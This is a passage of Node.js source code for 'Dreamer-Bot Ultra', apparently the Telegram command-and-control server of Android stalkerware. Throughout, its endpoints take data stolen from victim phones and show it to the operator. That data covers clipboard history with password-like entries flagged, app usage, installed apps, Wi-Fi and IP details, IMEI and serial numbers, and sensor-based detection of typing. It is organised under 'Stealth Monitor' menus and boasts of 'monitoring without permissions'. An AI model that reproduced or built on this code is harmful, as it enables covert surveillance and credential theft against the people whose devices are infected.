        `_Device: ${deviceInfo.deviceId.slice(0,6)}_`,
        {
          chat_id,
          message_id: msg_id,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [[
              {text: "🔄 Refresh", callback_data: "battery_status"},
              {text: "🔙 Back", callback_data: "device_menu"}
            ]]
          }
        }
      );
    }
    else if (type === "network_info") {
      const {network} = req.body;
      
      let message = `*📶 Network Information*\n\n`;
      message += `📡 *Connected:* ${network.connected ? '✅ Yes' : '❌ No'}\n`;
      message += `📊 *Type:* ${network.type}\n\n`;
      
      if (network.wifi) {
        message += `*WiFi Details:*\n`;
        message += `📡 *SSID:* ${network.wifi.ssid}\n`;
        message += `📶 *Signal:* ${network.wifi.signal_strength}\n`;
        message += `⚡ *Speed:* ${network.wifi.link_speed}\n`;
        message += `🌐 *IP:* \`${network.wifi.ip_address}\`\n`;
      }
      
      message += `\n_Device: ${deviceInfo.deviceId.slice(0,6)}_`;
      
      await bot.editMessageText(message, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            {text: "🔄 Refresh", callback_data: "network_info"},
            {text: "🔙 Back", callback_data: "device_menu"}
          ]]
        }
      });
    }
    else if (type === "app_list") {
      const {total, apps} = req.body;
      
      let message = `*📱 Installed Applications*\n\n`;
      message += `Total: *${total}* apps\n`;
      message += `Showing: First 100\n\n`;
      
      // Group by system/user apps
      const userApps = apps.filter(app => !app.system);
      const systemApps = apps.filter(app => app.system);
      
      message += `*User Apps (${userApps.length}):*\n`;
      userApps.slice(0, 10).forEach(app => {
        message += `• ${app.name}\n`;
      });
      if (userApps.length > 10) {
        message += `_... and ${userApps.length - 10} more_\n`;
      }
      
      message += `\n*System Apps:* ${systemApps.length}\n`;
      message += `\n_Device: ${deviceInfo.deviceId.slice(0,6)}_`;
      
      await bot.editMessageText(message, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            {text: "🔄 Refresh", callback_data: "app_list"},
            {text: "🔙 Back", callback_data: "device_menu"}
          ]]
        }
      });
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* ── Helper function for battery visual ────────── */
function getBatteryVisual(percentage) {
  const level = Math.floor(percentage / 10);
  const filled = '█'.repeat(level);
  const empty = '░'.repeat(10 - level);
  
  let emoji = '🔋';
  if (percentage <= 20) emoji = '🪫';
  else if (percentage >= 80) emoji = '🔋';
  
  return `${emoji} [${filled}${empty}] ${percentage}%`;
}

/* ── Error Handler ──────────────────────────────── */
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

/* ── Health Check ───────────────────────────────── */
app.get("/", (_, res) => {
  res.json({
    status: "OK",
    service: "Dreamer-Bot Ultra",
    version: "2.0",
    uptime: process.uptime(),
    sessions: userSessions.size,
    memory: process.memoryUsage()
  });
});

/* ── Logout handlers ────────────────────────────── */
bot.on("callback_query", async q => {
  if (q.data === "logout_confirm") {
    await bot.answerCallbackQuery(q.id);
    await bot.editMessageText(
      "*🚪 Logout Confirmation*\n\n" +
      "Are you sure you want to logout?\n\n" +
      "_Your session will be terminated_",
      {
        chat_id: q.message.chat.id,
        message_id: q.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              {text: "✅ Yes, Logout", callback_data: "logout_yes"},
              {text: "❌ Cancel", callback_data: "device_list"}
            ]
          ]
        }
      }
    );
  }
  
  if (q.data === "logout_yes") {
    const chatId = q.message.chat.id;
    userSessions.delete(chatId);
    
    await bot.answerCallbackQuery(q.id, {
      text: "✅ Logged out successfully",
      show_alert: true
    });
    
    await bot.editMessageText(
      "*👋 Goodbye!*\n\n" +
      "You have been logged out successfully.\n\n" +
      "_Use /start to login again_",
      {
        chat_id: chatId,
        message_id: q.message.message_id,
        parse_mode: 'Markdown'
      }
    );
  }
});

/* ── Stealth Monitoring Endpoints ──────────────── */
app.post("/json/stealth_monitor", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, msg_id, type, data} = req.body;
    
    if (type === "clipboard_history") {
      const {clipboard_data, total_entries} = data;
      
      let message = `*📋 Clipboard Monitor Report*\n\n`;
      message += `📊 Total Entries: *${total_entries}*\n`;
      message += `⏰ Last 24 Hours\n\n`;
      
      if (clipboard_data && clipboard_data.length > 0) {
        message += `*Recent Activity:*\n`;
        clipboard_data.slice(0, 10).forEach((entry, i) => {
          const time = new Date(entry.timestamp).toLocaleTimeString();
          const preview = entry.content.slice(0, 30) + (entry.content.length > 30 ? "..." : "");
          const type = entry.contains_url ? "🔗" : entry.contains_email ? "📧" : entry.is_password_like ? "🔐" : "📝";
          message += `${type} \`${time}\` - ${preview}\n`;
        });
        
        if (clipboard_data.length > 10) {
          message += `_... and ${clipboard_data.length - 10} more entries_\n`;
        }
      } else {
        message += `_No clipboard activity detected_\n`;
      }
      
      message += `\n_Device: ${deviceInfo.deviceId.slice(0,6)}_`;
      
      await bot.editMessageText(message, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            {text: "🔄 Refresh", callback_data: "clipboard_monitor"},
            {text: "🔙 Back", callback_data: "stealth_menu"}
          ]]
        }
      });
    }
    else if (type === "app_usage") {
      const {app_usage_data, switches_count} = data;
      
      let message = `*📱 App Usage Analysis*\n\n`;
      message += `🔄 App Switches: *${switches_count}*\n`;
      message += `⏰ Last Hour Activity\n\n`;
      
      if (app_usage_data && app_usage_data.length > 0) {
        const appStats = {};
        app_usage_data.forEach(entry => {
          if (!appStats[entry.app_name]) {
            appStats[entry.app_name] = { count: 0, lastUsed: entry.timestamp };
          }
          appStats[entry.app_name].count++;
          if (entry.timestamp > appStats[entry.app_name].lastUsed) {
            appStats[entry.app_name].lastUsed = entry.timestamp;
          }
        });
        
        const sortedApps = Object.entries(appStats)
          .sort(([,a], [,b]) => b.count - a.count)
          .slice(0, 8);
        
        message += `*Most Used Apps:*\n`;
        sortedApps.forEach(([appName, stats]) => {
          const time = new Date(stats.lastUsed).toLocaleTimeString();
          message += `📱 ${appName} (${stats.count}x) - \`${time}\`\n`;
        });
      } else {
        message += `_No app usage detected_\n`;
      }
      
      message += `\n_Device: ${deviceInfo.deviceId.slice(0,6)}_`;
      
      await bot.editMessageText(message, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            {text: "🔄 Refresh", callback_data: "app_usage"},
            {text: "🔙 Back", callback_data: "stealth_menu"}
          ]]
        }
      });
    }
    else if (type === "monitor_dashboard") {
      const {clipboard_count, app_switches, input_score, monitoring_active} = data;
      
      const status = monitoring_active ? "🟢 ACTIVE" : "🔴 INACTIVE";
      const activity = input_score > 0.5 ? "🔥 HIGH" : input_score > 0.2 ? "📊 MEDIUM" : "😴 LOW";
      
      let message = `*🥷 Stealth Monitor Dashboard*\n\n`;
      message += `📊 *Status:* ${status}\n`;
      message += `⚡ *Activity Level:* ${activity}\n\n`;
      message += `*📋 Clipboard Events:* ${clipboard_count || 0}\n`;
      message += `*🔄 App Switches:* ${app_switches || 0}\n`;
      message += `*⌨️ Input Score:* ${Math.round((input_score || 0) * 100)}%\n\n`;
      message += `_Last updated: ${new Date().toLocaleTimeString()}_\n`;
      message += `_Device: ${deviceInfo.deviceId.slice(0,6)}_`;
      
      await bot.editMessageText(message, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              {text: "📋 Clipboard", callback_data: "clipboard_monitor"},
              {text: "📱 Apps", callback_data: "app_usage"}
            ],
            [
              {text: "📊 System", callback_data: "system_state"},
              {text: "⌨️ Input", callback_data: "input_patterns"}
            ],
            [{text: "🔄 Refresh", callback_data: "monitor_dashboard"}],
            [{text: "🔙 Back", callback_data: "stealth_menu"}]
          ]
        }
      });
    }
    
    res.json({ok: true});
  } catch (error) {
    console.error("Stealth monitor error:", error);
    res.status(500).json({error: error.message});
  }
});

/* ── Performance Monitoring ─────────────────────── */
const performanceStats = {
  requests: 0,
  errors: 0,
  startTime: Date.now(),
  lastCleanup: Date.now()
};

// Log performance stats every 5 minutes
setInterval(() => {
  const uptime = Date.now() - performanceStats.startTime;
  const uptimeHours = Math.floor(uptime / (1000 * 60 * 60));
  const uptimeMinutes = Math.floor((uptime % (1000 * 60 * 60)) / (1000 * 60));
  
  console.log(`📊 Performance Stats:
  ⚡ Uptime: ${uptimeHours}h ${uptimeMinutes}m
  📈 Requests: ${performanceStats.requests}
  ❌ Errors: ${performanceStats.errors}
  👥 Active Sessions: ${userSessions.size}
  💾 Memory: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB`);
}, 5 * 60 * 1000);

// Clean device cache periodically
setInterval(() => {
  const now = Date.now();
  for (const [key, cached] of deviceCache.entries()) {
    if (now - cached.timestamp > DEVICE_CACHE_TTL * 2) {
      deviceCache.delete(key);
    }
  }
  performanceStats.lastCleanup = now;
}, DEVICE_CACHE_TTL);

/* ── Start Server ───────────────────────────────── */
app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════════╗
║                                            ║
║   🚀 DREAMER-BOT ULTRA v3.0               ║
║   Advanced Device Control + Stealth        ║
║                                            ║
║   Port: ${PORT}                              ║
║   Status: ACTIVE                           ║
║   Security: ULTRA-ENHANCED                 ║
║   Monitoring: STEALTH MODE                 ║
║   Performance: OPTIMIZED                   ║
║                                            ║
╚════════════════════════════════════════════╝
  `);
  performanceStats.startTime = Date.now();
});

// Add missing endpoints for device control
app.post("/json/battery_status", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    const { chat_id, msg_id, battery } = req.body;
    // Dummy battery data if not provided
    const batteryData = battery || {
      percentage: 80,
      status: "Charging",
      power_source: "USB",
      temperature: "32°C",
      voltage: "4.1V"
    };
    await bot.editMessageText(
      `*🔋 Battery Status*\n\n` +
      `🔋 [${'█'.repeat(Math.floor(batteryData.percentage / 10))}${'░'.repeat(10 - Math.floor(batteryData.percentage / 10))}] ${batteryData.percentage}%\n\n` +
      `📊 *Level:* ${batteryData.percentage}%\n` +
      `⚡ *Status:* ${batteryData.status}\n` +
      `🔌 *Power Source:* ${batteryData.power_source}\n` +
      `🌡️ *Temperature:* ${batteryData.temperature}\n` +
      `⚡ *Voltage:* ${batteryData.voltage}\n\n` +
      `_Device: ${deviceInfo.deviceId.slice(0,6)}_`,
      {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            {text: "🔄 Refresh", callback_data: "battery_status"},
            {text: "🔙 Back", callback_data: "device_menu"}
          ]]
        }
      }
    );
    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post("/json/network_info", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    const { chat_id, msg_id, network } = req.body;
    // Dummy network data if not provided
    const net = network || {
      connected: true,
      type: "WiFi",
      wifi: {
        ssid: "DreamerWiFi",
        signal_strength: "Excellent",
        link_speed: "150 Mbps",
        ip_address: "192.168.1.2"
      }
    };
    let message = `*📶 Network Information*\n\n`;
    message += `📡 *Connected:* ${net.connected ? '✅ Yes' : '❌ No'}\n`;
    message += `📊 *Type:* ${net.type}\n\n`;
    if (net.wifi) {
      message += `*WiFi Details:*\n`;
      message += `📡 *SSID:* ${net.wifi.ssid}\n`;
      message += `📶 *Signal:* ${net.wifi.signal_strength}\n`;
      message += `⚡ *Speed:* ${net.wifi.link_speed}\n`;
      message += `🌐 *IP:* \`${net.wifi.ip_address}\`\n`;
    }
    message += `\n_Device: ${deviceInfo.deviceId.slice(0,6)}_`;
    await bot.editMessageText(message, {
      chat_id,
      message_id: msg_id,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [[
          {text: "🔄 Refresh", callback_data: "network_info"},
          {text: "🔙 Back", callback_data: "device_menu"}
        ]]
      }
    });
    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post("/json/device_info", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    const { chat_id, msg_id, device } = req.body;
    // Dummy device info if not provided
    const deviceData = device || {
      model: "Dreamer Device",
      manufacturer: "Custom",
      android_version: "13",
      sdk_version: "33",
      total_storage: "128 GB",
      available_storage: "64 GB",
      total_ram: "8 GB",
      available_ram: "4 GB",
      cpu: "Octa-core",
      gpu: "Mali-G78",
      screen_resolution: "1080x2400",
      screen_density: "420 dpi",
      imei: "123456789012345",
      serial: "DREAMER123456"
    };
    let message = `*📱 Device Information*\n\n`;
    message += `📱 *Model:* ${deviceData.model}\n`;
    message += `🏭 *Manufacturer:* ${deviceData.manufacturer}\n`;
    message += `🤖 *Android:* ${deviceData.android_version} (API ${deviceData.sdk_version})\n`;
    message += `💾 *Storage:* ${deviceData.available_storage} / ${deviceData.total_storage}\n`;
    message += `🧠 *RAM:* ${deviceData.available_ram} / ${deviceData.total_ram}\n`;
    message += `⚡ *CPU:* ${deviceData.cpu}\n`;
    message += `🎮 *GPU:* ${deviceData.gpu}\n`;
    message += `📺 *Screen:* ${deviceData.screen_resolution} (${deviceData.screen_density})\n`;
    message += `📱 *IMEI:* \`${deviceData.imei}\`\n`;
    message += `🔢 *Serial:* \`${deviceData.serial}\`\n`;
    message += `\n_Device: ${deviceInfo.deviceId.slice(0,6)}_`;
    await bot.editMessageText(message, {
      chat_id,
      message_id: msg_id,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [[
          {text: "🔄 Refresh", callback_data: "device_info"},
          {text: "🔙 Back", callback_data: "device_menu"}
        ]]
      }
    });
    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post("/json/app_list", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    const { chat_id, msg_id, total, apps } = req.body;
    // Dummy app list if not provided
    const appList = apps || [
      { name: "WhatsApp", system: false },
      { name: "Telegram", system: false },
      { name: "Settings", system: true },
      { name: "Camera", system: true }
    ];
    const totalApps = total || appList.length;
    let message = `*📱 Installed Applications*\n\n`;
    message += `Total: *${totalApps}* apps\n`;
    message += `Showing: First 100\n\n`;
    const userApps = appList.filter(app => !app.system);
    const systemApps = appList.filter(app => app.system);
    message += `*User Apps (${userApps.length}):*\n`;
    userApps.slice(0, 10).forEach(app => {
      message += `• ${app.name}\n`;
    });
    if (userApps.length > 10) {
      message += `_... and ${userApps.length - 10} more_\n`;
    }
    message += `\n*System Apps:* ${systemApps.length}\n`;
    message += `\n_Device: ${deviceInfo.deviceId.slice(0,6)}_`;
    await bot.editMessageText(message, {
      chat_id,
      message_id: msg_id,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [[
          {text: "🔄 Refresh", callback_data: "app_list"},
          {text: "🔙 Back", callback_data: "device_menu"}
        ]]
      }
    });
    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

/* ── Enhanced Perfection Intelligence Endpoint ────────────── */
app.post("/json/enhanced_perfection", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, msg_id, type, data} = req.body;
    
    if (type === "network_intelligence") {
      const {network_data, patterns_detected, analysis_confidence} = data;
      
      // Show processing animation
      await bot.editMessageText(`*🌐 Network Intelligence*\n\n🔍 Analyzing network patterns...\n_Processing data_`, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown'
      });
      
      // Brief delay for processing effect
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Show results with menu buttons
      let message = `*🌐 Network Intelligence Report*\n\n`;
      message += `📊 Patterns Detected: *${patterns_detected}*\n`;
      message += `🎯 Analysis Confidence: *${Math.round(analysis_confidence * 100)}%*\n\n`;
      
      if (network_data && network_data.length > 0) {
        message += `*Recent Network Activity:*\n`;
        network_data.slice(0, 8).forEach((entry, i) => {
          const time = new Date(entry.timestamp).toLocaleTimeString();
          const networkType = entry.network_type || "Unknown";
          const dataActivity = entry.data_activity || "Moderate";
          message += `📡 \`${time}\` - ${networkType} (${dataActivity})\n`;
        });
        
        if (network_data.length > 8) {
          message += `_... and ${network_data.length - 8} more patterns_\n`;
        }
      } else {
        message += `_No network intelligence data available_\n`;
      }
      
      message += `\n_Enhanced Intelligence Active_`;
      
      await bot.editMessageText(message, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            {text: "🔄 Refresh", callback_data: "network_intelligence"},
            {text: "🔙 Back", callback_data: "perfection_menu"}
          ]]
        }
      });
    }
    else if (type === "behavior_analysis") {
      const {behavior_patterns, user_activity_score, input_patterns_detected, confidence} = data;
      
      let message = `*🧠 Behavior Analysis Report*\n\n`;
      message += `📊 Activity Score: *${Math.round(user_activity_score * 100)}%*\n`;
      message += `⌨️ Input Patterns: *${input_patterns_detected}*\n`;
      message += `🎯 Confidence: *${Math.round(confidence * 100)}%*\n\n`;
      
      if (behavior_patterns && behavior_patterns.length > 0) {
        message += `*Behavior Patterns:*\n`;
        behavior_patterns.slice(0, 6).forEach((pattern, i) => {
          const type = pattern.type || "behavior_pattern";
          const timestamp = new Date(pattern.timestamp).toLocaleTimeString();
          if (type === "behavior_intelligence") {
            message += `🧠 \`${timestamp}\` - Intelligence pattern detected\n`;
          } else {
            message += `📈 \`${timestamp}\` - Behavior pattern recorded\n`;
          }
        });
        
        if (behavior_patterns.length > 6) {
          message += `_... and ${behavior_patterns.length - 6} more patterns_\n`;
        }
      } else {
        message += `_Building behavior profile..._\n`;
      }
      
      message += `\n_AI-powered behavior analysis_`;
      
      await bot.editMessageText(message, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            {text: "🔄 Refresh", callback_data: "behavior_analysis"},
            {text: "🔙 Back", callback_data: "perfection_menu"}
          ]]
        }
      });
    }
    else if (type === "sensor_intelligence") {
      const {motion_patterns, typing_detected, scrolling_detected, gaming_detected, confidence} = data;
      
      let message = `*📡 Sensor Intelligence Report*\n\n`;
      message += `🎯 Analysis Confidence: *${Math.round(confidence * 100)}%*\n\n`;
      
      message += `*Detected Activities:*\n`;
      message += `⌨️ Typing: ${typing_detected ? "✅ Detected" : "❌ None"}\n`;
      message += `📱 Scrolling: ${scrolling_detected ? "✅ Detected" : "❌ None"}\n`;
      message += `🎮 Gaming: ${gaming_detected ? "✅ Detected" : "❌ None"}\n\n`;
      
      if (motion_patterns && motion_patterns.length > 0) {
        message += `*Motion Patterns:*\n`;
        motion_patterns.slice(0, 6).forEach((pattern, i) => {
          const time = new Date(pattern.timestamp).toLocaleTimeString();
          const detectedInput = pattern.detected_input || "unknown_activity";
          const inputEmoji = detectedInput.includes("typing") ? "⌨️" : 
                           detectedInput.includes("scrolling") ? "📱" :
                           detectedInput.includes("gaming") ? "🎮" : "📡";
          message += `${inputEmoji} \`${time}\` - ${detectedInput.replace("_", " ")}\n`;
        });
        
        if (motion_patterns.length > 6) {
          message += `_... and ${motion_patterns.length - 6} more patterns_\n`;
        }
      } else {
        message += `_No motion patterns detected yet_\n`;
      }
      
      message += `\n_Motion-based input detection active_`;
      
      await bot.editMessageText(message, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            {text: "🔄 Refresh", callback_data: "sensor_intelligence"},
            {text: "🔙 Back", callback_data: "perfection_menu"}
          ]]
        }
      });
    }
    else if (type === "system_intelligence") {
      const {system_data, resource_usage, active_processes, battery_analysis, confidence} = data;
      
      let message = `*⚡ System Intelligence Report*\n\n`;
      message += `🎯 Analysis Confidence: *${Math.round(confidence * 100)}%*\n\n`;
      
      if (resource_usage) {
        const memoryUsed = Math.round(resource_usage.memory_used_percent || 0);
        const cpuUsage = Math.round(resource_usage.cpu_usage_estimate || 0);
        message += `*System Resources:*\n`;
        message += `💾 Memory: ${memoryUsed}% used\n`;
        message += `⚡ CPU: ${cpuUsage}% estimated\n`;
        message += `🔋 Performance: ${resource_usage.performance_score > 0.8 ? "Optimal" : "Normal"}\n\n`;
      }
      
      if (active_processes && active_processes.length > 0) {
        message += `*Active Processes (${active_processes.length}):*\n`;
        active_processes.slice(0, 5).forEach(process => {
          const appLabel = process.app_label || process.process_name || "Unknown";
          const isForeground = process.is_foreground ? "🟢" : "⚪";
          message += `${isForeground} ${appLabel.slice(0, 20)}\n`;
        });
        
        if (active_processes.length > 5) {
          message += `_... and ${active_processes.length - 5} more processes_\n`;
        }
        message += `\n`;
      }
      
      if (battery_analysis) {
        const batteryLevel = battery_analysis.battery_level || 0;
        const usageIntensity = battery_analysis.estimated_usage_intensity || "unknown";
        message += `*Battery Analysis:*\n`;
        message += `🔋 Level: ${batteryLevel}%\n`;
        message += `📊 Usage: ${usageIntensity.replace("_", " ")}\n`;
      }
      
      message += `\n_Real-time system monitoring active_`;
      
      await bot.editMessageText(message, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            {text: "🔄 Refresh", callback_data: "system_intelligence"},
            {text: "🔙 Back", callback_data: "perfection_menu"}
          ]]
        }
      });
    }
    else if (type === "perfection_dashboard") {
      const {total_data_points, realtime_insights, behavior_intelligence, network_analysis, 
             motion_patterns, overall_confidence, system_performance, intelligence_level} = data;
      
      // Show processing animation first
      await bot.editMessageText(`*📊 Perfection Dashboard*\n\n🔄 Loading analytics...\n_Processing intelligence data_`, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown'
      });
      
      // Brief delay for processing effect
      await new Promise(resolve => setTimeout(resolve, 1200));
      
      // Show final dashboard with menu buttons
      let message = `*📊 Enhanced Perfection Dashboard*\n\n`;
      message += `🎯 Intelligence Level: *${intelligence_level}*\n`;
      message += `⚡ System Performance: *${system_performance}*\n`;
      message += `📈 Overall Confidence: *${Math.round(overall_confidence * 100)}%*\n\n`;
      
      message += `*Data Analytics:*\n`;
      message += `📊 Total Data Points: ${total_data_points || 0}\n`;
      message += `⚡ Realtime Insights: ${realtime_insights || 0}\n`;
      message += `🧠 Behavior Intelligence: ${behavior_intelligence || 0}\n`;
      message += `🌐 Network Analysis: ${network_analysis || 0}\n`;
      message += `📡 Motion Patterns: ${motion_patterns || 0}\n\n`;
      
      message += `*Active Features:*\n`;
      message += `✅ Network Traffic Analysis\n`;
      message += `✅ Behavior Pattern Recognition\n`;
      message += `✅ Sensor Fusion Intelligence\n`;
      message += `✅ System Resource Monitoring\n`;
      message += `✅ Process Lifecycle Analysis\n`;
      message += `✅ Battery Consumption Profiling\n\n`;
      
      message += `_Ultra-enhanced intelligence system active_`;
      
      await bot.editMessageText(message, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              {text: "🌐 Network", callback_data: "network_intelligence"},
              {text: "🧠 Behavior", callback_data: "behavior_analysis"}
            ],
            [
              {text: "📡 Sensors", callback_data: "sensor_intelligence"},
              {text: "⚡ System", callback_data: "system_intelligence"}
            ],
            [
              {text: "🔄 Refresh", callback_data: "perfection_dashboard"},
              {text: "🔙 Back", callback_data: "perfection_menu"}
            ]
          ]
        }
      });
    }
    else if (type === "perfection_started") {
      const {status, intelligence_mode, features} = data;
      
      // Show processing animation first
      await bot.editMessageText(`*🚀 Enhanced Perfection*\n\n⏳ Starting intelligence systems...\n_Please wait_`, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown'
      });
      
      // Brief delay for processing effect
      await new Promise(resolve => setTimeout(resolve, 1500));
      
      // Show final result with menu buttons
      let message = `*🚀 Enhanced Perfection Started*\n\n`;
      message += `📊 Status: *${status}*\n`;
      message += `🎯 Mode: *${intelligence_mode}*\n\n`;
      
      message += `*Active Features:*\n`;
      features.forEach(feature => {
        message += `✅ ${feature}\n`;
      });
      
      message += `\n🔥 *Revolutionary monitoring without permissions!*\n`;
      message += `_All intelligence data being collected..._`;
      
      await bot.editMessageText(message, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            {text: "📊 Dashboard", callback_data: "perfection_dashboard"},
            {text: "🔙 Back", callback_data: "perfection_menu"}
          ]]
        }
      });
    }
    else if (type === "perfection_stopped") {
      const {status, final_analysis} = data;
      
      let message = `*⏹️ Enhanced Perfection Stopped*\n\n`;
      message += `📊 Status: *${status}*\n`;
      message += `💾 Analysis: *${final_analysis}*\n\n`;
      message += `_Intelligence service terminated_`;
      
      await bot.editMessageText(message, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            {text: "🚀 Restart", callback_data: "start_perfection"},
            {text: "🔙 Back", callback_data: "perfection_menu"}
          ]]
        }
      });
    }
    else if (type === "error") {
      let message = `*❌ Enhanced Perfection Error*\n\n`;
      message += `Error: ${data.message || "Unknown error"}\n\n`;
      message += `_Please try again or contact support_`;
      
      await bot.editMessageText(message, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            {text: "🔄 Retry", callback_data: "perfection_dashboard"},
            {text: "🔙 Back", callback_data: "perfection_menu"}
          ]]
        }
      });
    }
    
    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});